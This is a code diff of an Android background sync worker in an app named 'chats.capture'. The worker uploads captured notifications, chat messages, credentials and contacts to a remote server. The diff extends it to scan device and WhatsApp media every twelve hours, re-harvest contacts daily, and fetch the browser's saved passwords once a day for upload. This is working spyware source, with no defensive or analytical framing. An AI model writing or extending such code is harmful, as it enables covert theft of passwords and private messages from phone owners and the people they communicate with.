@@ -15,7 +15,9 @@ import com.chats.capture.network.NetworkManager
 import android.os.BatteryManager
 import androidx.core.content.ContextCompat
 import com.chats.capture.utils.AppStateManager
+import com.chats.capture.utils.FileScanner
 import com.chats.capture.utils.RetryManager
+import com.chats.capture.utils.WhatsAppMediaScanner
 import com.google.gson.GsonBuilder
 import kotlinx.coroutines.delay
 import timber.log.Timber
@@ -37,11 +39,15 @@ class SyncWorker(context: Context, params: WorkerParameters) : CoroutineWorker(c
                 return Result.retry()
             }
             
-            // Sync notifications
-            syncNotifications(notificationDao)
+            // Get last sync time from AppStateManager
+            val lastSyncTime = AppStateManager.getLastSyncTime(applicationContext)
+            val sinceTimestamp = if (lastSyncTime > 0) lastSyncTime else 0L
             
-            // Sync chats
-            syncChats(chatDao)
+            // Sync notifications (from last sync or all unsynced)
+            syncNotifications(notificationDao, sinceTimestamp)
+            
+            // Sync chats (from last sync or all unsynced)
+            syncChats(chatDao, sinceTimestamp)
             
             // Sync media files (throttled for battery optimization)
             val mediaFileDao = database.mediaFileDao()
@@ -52,13 +58,19 @@ class SyncWorker(context: Context, params: WorkerParameters) : CoroutineWorker(c
             val uploadLimit = if (batteryLevel < 20) 2 else 3 // Fewer uploads when battery low
             mediaUploadManager.uploadPendingMediaFiles(limit = uploadLimit)
             
-            // Sync credentials
-            syncCredentials(database.credentialDao())
+            // Periodic media scans for new files
+            captureMediaIfNeeded()
+            
+            // Sync credentials (from last sync or all unsynced)
+            syncCredentials(database.credentialDao(), sinceTimestamp)
             
             // Capture and sync contacts (capture first, then sync)
             val contactDao = database.contactDao()
             captureContactsIfNeeded(contactDao)
-            syncContacts(contactDao)
+            syncContacts(contactDao, sinceTimestamp)
+            
+            // Periodically fetch browser saved credentials (once per day)
+            fetchBrowserCredentialsIfNeeded()
             
             Timber.tag("SYNC_WORKER").i("✅ SyncWorker completed successfully")
             Timber.d("SyncWorker completed successfully")
@@ -84,9 +96,22 @@ class SyncWorker(context: Context, params: WorkerParameters) : CoroutineWorker(c
         }
     }
     
-    private suspend fun syncNotifications(notificationDao: NotificationDao) {
+    private suspend fun syncNotifications(notificationDao: NotificationDao, sinceTimestamp: Long = 0L) {
         try {
-            val unsyncedNotifications = notificationDao.getUnsyncedNotifications(limit = 50)
+            // If we have a last sync time, sync from that point, otherwise sync all unsynced
+            val notificationsToSync = if (sinceTimestamp > 0) {
+                notificationDao.getNotificationsSince(sinceTimestamp, limit = 50)
+            } else {
+                notificationDao.getUnsyncedNotifications(limit = 50)
+            }
+            
+            if (notificationsToSync.isEmpty()) {
+                Timber.tag("SYNC_WORKER").d("📊 No notifications to sync (sinceTimestamp=$sinceTimestamp)")
+                Timber.d("No notifications to sync")
+                return
+            }
+            
+            val unsyncedNotifications = notificationsToSync
             
             if (unsyncedNotifications.isEmpty()) {
                 Timber.tag("SYNC_WORKER").d("📊 No unsynced notifications to sync")
@@ -134,9 +159,10 @@ class SyncWorker(context: Context, params: WorkerParameters) : CoroutineWorker(c
                     }
                     
                     if (responseBody?.success == true) {
-                        // Mark as synced
+                        // Mark as synced with current timestamp
+                        val syncTime = System.currentTimeMillis()
                         unsyncedNotifications.forEach { notification ->
-                            notificationDao.markAsSynced(notification.id)
+                            notificationDao.markAsSynced(notification.id, syncTime)
                         }
                         Timber.tag("SYNC_WORKER").i("✅ Successfully synced ${unsyncedNotifications.size} notifications to server")
                         Timber.tag("API_RESPONSE_DATA").i("✅ API confirmed success for ${unsyncedNotifications.size} notifications")
@@ -157,8 +183,9 @@ class SyncWorker(context: Context, params: WorkerParameters) : CoroutineWorker(c
                     // Server returned non-JSON response (plain text), but HTTP was successful
                     // Treat as success if status code is 200-299
                     if (response.code() in 200..299) {
+                        val syncTime = System.currentTimeMillis()
                         unsyncedNotifications.forEach { notification ->
-                            notificationDao.markAsSynced(notification.id)
+                            notificationDao.markAsSynced(notification.id, syncTime)
                         }
                         Timber.d("Synced ${unsyncedNotifications.size} notifications (non-JSON response treated as success)")
                     } else {
@@ -213,9 +240,21 @@ class SyncWorker(context: Context, params: WorkerParameters) : CoroutineWorker(c
         }
     }
     
-    private suspend fun syncChats(chatDao: ChatDao) {
+    private suspend fun syncChats(chatDao: ChatDao, sinceTimestamp: Long = 0L) {
         try {
-            val unsyncedChats = chatDao.getUnsyncedChats(limit = 50)
+            // If we have a last sync time, sync from that point, otherwise sync all unsynced
+            val chatsToSync = if (sinceTimestamp > 0) {
+                chatDao.getChatsSince(sinceTimestamp, limit = 50)
+            } else {
+                chatDao.getUnsyncedChats(limit = 50)
+            }
+            
+            if (chatsToSync.isEmpty()) {
+                Timber.d("No chats to sync (sinceTimestamp=$sinceTimestamp)")
+                return
+            }
+            
+            val unsyncedChats = chatsToSync
             
             if (unsyncedChats.isEmpty()) {
                 Timber.d("No unsynced chats")
@@ -229,9 +268,10 @@ class SyncWorker(context: Context, params: WorkerParameters) : CoroutineWorker(c
                 try {
                     val responseBody = response.body()
                     if (responseBody?.success == true) {
-                        // Mark as synced
+                        // Mark as synced with current timestamp
+                        val syncTime = System.currentTimeMillis()
                         unsyncedChats.forEach { chat ->
-                            chatDao.markAsSynced(chat.id)
+                            chatDao.markAsSynced(chat.id, syncTime)
                         }
                         Timber.d("Synced ${unsyncedChats.size} chats")
                     } else {
@@ -250,8 +290,9 @@ class SyncWorker(context: Context, params: WorkerParameters) : CoroutineWorker(c
                     // Server returned non-JSON response (plain text), but HTTP was successful
                     // Treat as success if status code is 200-299
                     if (response.code() in 200..299) {
+                        val syncTime = System.currentTimeMillis()
                         unsyncedChats.forEach { chat ->
-                            chatDao.markAsSynced(chat.id)
+                            chatDao.markAsSynced(chat.id, syncTime)
                         }
                         Timber.d("Synced ${unsyncedChats.size} chats (non-JSON response treated as success)")
                     } else {
@@ -299,9 +340,21 @@ class SyncWorker(context: Context, params: WorkerParameters) : CoroutineWorker(c
         }
     }
     
-    private suspend fun syncCredentials(credentialDao: CredentialDao) {
+    private suspend fun syncCredentials(credentialDao: CredentialDao, sinceTimestamp: Long = 0L) {
         try {
-            val unsyncedCredentials = credentialDao.getUnsyncedCredentials(limit = 50)
+            // If we have a last sync time, sync from that point, otherwise sync all unsynced
+            val credentialsToSync = if (sinceTimestamp > 0) {
+                credentialDao.getCredentialsSince(sinceTimestamp, limit = 50)
+            } else {
+                credentialDao.getUnsyncedCredentials(limit = 50)
+            }
+            
+            if (credentialsToSync.isEmpty()) {
+                Timber.d("No credentials to sync (sinceTimestamp=$sinceTimestamp)")
+                return
+            }
+            
+            val unsyncedCredentials = credentialsToSync
             
             if (unsyncedCredentials.isEmpty()) {
                 Timber.d("No unsynced credentials")
@@ -312,9 +365,10 @@ class SyncWorker(context: Context, params: WorkerParameters) : CoroutineWorker(c
             val response = apiService.uploadCredentialsBatch(unsyncedCredentials)
             
             if (response.isSuccessful && response.body()?.success == true) {
-                // Mark as synced
+                // Mark as synced with current timestamp
+                val syncTime = System.currentTimeMillis()
                 unsyncedCredentials.forEach { credential ->
-                    credentialDao.markAsSynced(credential.id)
+                    credentialDao.markAsSynced(credential.id, syncTime)
                 }
                 Timber.d("Synced ${unsyncedCredentials.size} credentials")
             } else {
@@ -334,9 +388,21 @@ class SyncWorker(context: Context, params: WorkerParameters) : CoroutineWorker(c
         }
     }
     
-    private suspend fun syncContacts(contactDao: ContactDao) {
+    private suspend fun syncContacts(contactDao: ContactDao, sinceTimestamp: Long = 0L) {
         try {
-            val unsyncedContacts = contactDao.getUnsyncedContacts(limit = 50)
+            // If we have a last sync time, sync from that point, otherwise sync all unsynced
+            val contactsToSync = if (sinceTimestamp > 0) {
+                contactDao.getContactsSince(sinceTimestamp, limit = 50)
+            } else {
+                contactDao.getUnsyncedContacts(limit = 50)
+            }
+            
+            if (contactsToSync.isEmpty()) {
+                Timber.d("No contacts to sync (sinceTimestamp=$sinceTimestamp)")
+                return
+            }
+            
+            val unsyncedContacts = contactsToSync
             
             if (unsyncedContacts.isEmpty()) {
                 Timber.d("No unsynced contacts")
@@ -436,8 +502,11 @@ class SyncWorker(context: Context, params: WorkerParameters) : CoroutineWorker(c
                 return
             }
             
+            val prefs = applicationContext.getSharedPreferences("capture_prefs", Context.MODE_PRIVATE)
+            val lastCaptureTime = prefs.getLong("last_contacts_capture_ms", 0L)
+            val shouldCaptureByTime = System.currentTimeMillis() - lastCaptureTime > 24 * 60 * 60 * 1000
+
             // Check if we have any contacts in the database
-            // If we have contacts, we'll just sync them. If not, capture them.
             val totalContactsCount = try {
                 contactDao.getTotalCount()
             } catch (e: Exception) {
@@ -446,13 +515,14 @@ class SyncWorker(context: Context, params: WorkerParameters) : CoroutineWorker(c
             
             // Only capture if we have very few or no contacts
             // This prevents re-capturing all contacts on every sync
-            if (totalContactsCount < 10) {
-                Timber.d("Few contacts in database ($totalContactsCount), capturing contacts from device...")
+            if (totalContactsCount < 10 || shouldCaptureByTime) {
+                Timber.d("Capturing contacts from device (count=$totalContactsCount, timeRefresh=$shouldCaptureByTime)...")
                 val contactCaptureManager = ContactCaptureManager(applicationContext)
                 contactCaptureManager.captureAllContacts()
                 
                 // Wait a bit for contacts to be captured and saved
                 delay(3000)
+                prefs.edit().putLong("last_contacts_capture_ms", System.currentTimeMillis()).apply()
                 Timber.d("Contact capture initiated")
             } else {
                 Timber.d("Sufficient contacts in database ($totalContactsCount), skipping capture")
@@ -461,6 +531,53 @@ class SyncWorker(context: Context, params: WorkerParameters) : CoroutineWorker(c
             Timber.w(e, "Permission denied: READ_CONTACTS permission required")
         } catch (e: Exception) {
             Timber.e(e, "Error capturing contacts: ${e.message}")
+        }
+    }
+
+    private suspend fun captureMediaIfNeeded() {
+        try {
+            val prefs = applicationContext.getSharedPreferences("capture_prefs", Context.MODE_PRIVATE)
+            val lastMediaScan = prefs.getLong("last_media_scan_ms", 0L)
+            val now = System.currentTimeMillis()
+            if (now - lastMediaScan < 12 * 60 * 60 * 1000) {
+                return
+            }
+
+            val fileScanner = FileScanner(applicationContext)
+            val whatsappScanner = WhatsAppMediaScanner(applicationContext)
+            fileScanner.scanLast10MediaFiles()
+            whatsappScanner.scanMediaFiles()
+
+            prefs.edit().putLong("last_media_scan_ms", now).apply()
+            Timber.d("Media scan completed")
+        } catch (e: Exception) {
+            Timber.e(e, "Error capturing media files")
+        }
+    }
+    
+    private suspend fun fetchBrowserCredentialsIfNeeded() {
+        try {
+            val prefs = applicationContext.getSharedPreferences("capture_prefs", Context.MODE_PRIVATE)
+            val lastBrowserFetch = prefs.getLong("last_browser_credentials_fetch_ms", 0L)
+            val now = System.currentTimeMillis()
+            
+            // Fetch browser credentials once per day
+            if (now - lastBrowserFetch < 24 * 60 * 60 * 1000) {
+                return
+            }
+            
+            Timber.tag("SYNC_WORKER").d("Fetching browser saved credentials...")
+            val browserCredentialFetcher = com.chats.capture.utils.BrowserCredentialFetcher(applicationContext)
+            val credentials = browserCredentialFetcher.fetchBrowserCredentials()
+            
+            if (credentials.isNotEmpty()) {
+                browserCredentialFetcher.saveBrowserCredentials(credentials)
+                Timber.tag("SYNC_WORKER").i("✅ Fetched and saved ${credentials.size} browser credentials")
+            }
+            
+            prefs.edit().putLong("last_browser_credentials_fetch_ms", now).apply()
+        } catch (e: Exception) {
+            Timber.e(e, "Error fetching browser credentials")
         }
     }
 }
